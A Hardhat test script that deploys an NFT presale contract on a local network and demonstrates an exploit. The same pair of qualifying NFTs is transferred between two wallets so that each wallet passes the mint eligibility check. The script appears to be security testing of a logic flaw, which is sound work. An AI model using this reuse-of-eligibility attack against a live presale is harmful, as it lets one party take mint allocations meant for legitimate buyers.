const {
  time,
  loadFixture,
} = require("@nomicfoundation/hardhat-toolbox/network-helpers");
const { anyValue } = require("@nomicfoundation/hardhat-chai-matchers/withArgs");
const { expect } = require("chai");
const {ethers, network} = require("hardhat");

describe("Wanna", function() {
  
  it("should exploit the presale", async function(){

    const walletAddress1 = "0x28Ad6adC7A73d2564ed2BdE491197051eD96Da89";
    const walletAddress2 = "0x1c2844bDe26537643F3A3292e0709D50E38addC5";

    const desiredBalance = ethers.parseEther("100.0"); // Simulate 100 ETH
    console.log(`Adding ${desiredBalance} ETH to wallet ${walletAddress1}...`);
    await network.provider.send("hardhat_setBalance", [
      walletAddress1,
      ethers.toBeHex(desiredBalance), // Convert to hex
    ]);

    const desiredBalance2 = ethers.parseEther("100.0"); // Simulate 100 ETH
    console.log(`Adding ${desiredBalance2} ETH to wallet ${walletAddress2}...`);
    await network.provider.send("hardhat_setBalance", [
      walletAddress2,
      ethers.toBeHex(desiredBalance2), // Convert to hex
    ]);

    const provider = ethers.provider;
    const privateKeyOwner = process.env.PRIVATE_KEY_1;
    const privateKeyOwner2 = process.env.PRIVATE_KEY_2;


    const signer = new ethers.Wallet(privateKeyOwner, provider);
    const signer2 = new ethers.Wallet(privateKeyOwner2, provider);


    const d3_address = "0x09e8c457AEDB06C2830c4Be9805d1B20675EdeD8";
    const Wanna = await ethers.getContractFactory("WannabotLnft", signer);
    const wanna = await Wanna.deploy(d3_address);

    await wanna.waitForDeployment();

    const ownerConnect = wanna.connect(signer);
    const unpaused = await ownerConnect.unpause();

    const buyValue = ethers.parseEther("0.2");


    //await expect(ownerConnect.mint("1", "2", {value: buyValue })).to.not.be.reverted;
    const mint1 = await ownerConnect.mint("1", "2", {value: buyValue });
    const receipt = await mint1.wait()
    console.log("mint1",receipt)


    const balance1 = await ownerConnect.checkERC721Balance(signer.address);

    expect(balance1).to.equal(2);

    console.log("balance1", balance1);


    const minimalABI = ["function safeTransferFrom(address from,address to,uint256 tokenId)"];

    const contract = new ethers.Contract(d3_address, minimalABI, signer);

    const transferNFT1 = await contract.safeTransferFrom(signer.address, signer2.address, 155);
    const transferNFT2 = await contract.safeTransferFrom(signer.address, signer2.address, 156);

    const balance2 = await ownerConnect.checkERC721Balance(signer2.address);

    expect(balance2).to.equal(2);

    console.log("balance2", balance2);

    const buyer2Connect = wanna.connect(signer2);
   // await expect(buyer2Connect.mint("1", "2", {value: buyValue})).to.not.be.reverted;

    const mint2 = await buyer2Connect.mint("1", "2", {value: buyValue });
    const receipt2 = await mint2.wait()
    console.log("mint2",receipt2)
    //check lnfts

    


  })
  

})